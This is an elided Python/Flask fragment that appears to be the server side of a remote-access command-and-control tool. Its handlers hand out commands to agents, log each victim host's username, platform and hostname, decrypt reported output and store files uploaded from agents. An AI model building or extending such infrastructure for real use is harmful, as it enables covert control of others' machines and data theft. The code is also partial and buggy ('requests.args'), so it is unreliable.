...
def get_command(agent_id):
    ...
    if request.args:
        agent.username = requests.args.get("username")
        agent.operating_system = requests.args.get("platform")
        agent.hostname = requests.args.get("hostname")
...
def report_command(agent_id):
    ...
    if not agent:
        abort(404)
    out = decrypts(request.form['output'])
...
def upload(agent_id):
    ...
    for file in request.files.values():
        ...
        nums1 = ''.join(random.choice(letters) for i in range(10))
        nums2 = ''.join(random.choice(letters) for i in range(10))
        upload_dir = os.path.join(current_app.config['UPLOAD_FOLDER'] + '/' + today + '/' + nums2)
        agent_dir = agent_id
        store_dir = os.path.join(upload_dir, agent_dir)
        filename = secure_filename(file.filename + nums1)
        ...
        while os.path.exists(file_path):
            ...
            file_path = os.path.join(store_dir, filename)
        file.save(file_path)
        download_link = url_for('webui.uploads', path=today + '/' + nums2 + '/' +agent_dir + '/' + filename)
